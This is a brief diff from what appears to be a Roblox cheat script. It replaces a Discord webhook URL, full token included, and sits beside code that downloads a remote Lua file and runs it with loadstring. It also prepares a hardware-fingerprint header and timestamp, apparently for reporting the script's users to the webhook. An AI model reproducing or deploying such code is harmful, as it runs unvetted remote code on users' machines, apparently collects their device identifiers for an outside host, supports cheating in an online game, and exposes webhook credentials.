@@ -1870,7 +1870,7 @@ end)
 wait(1)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
 
-local url = 'https://discord.com/api/webhooks/962883148901929050/L9G5cfJ6Dpw4g_nHDye3mHvZOwDPr5FW2OyvzpQrFzUoUiCNqfw4BXfTELF9loTMtoUz'
+local url = 'https://discord.com/api/webhooks/967921428039090247/GSgtoVdienq9gJaySUK4cNvmIY9cDpKI073p17fQz9L86x-u1lIHDWD5eLQKKbK7uFLI'
 local req = syn.request
 local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
 local OSTime = os.time()
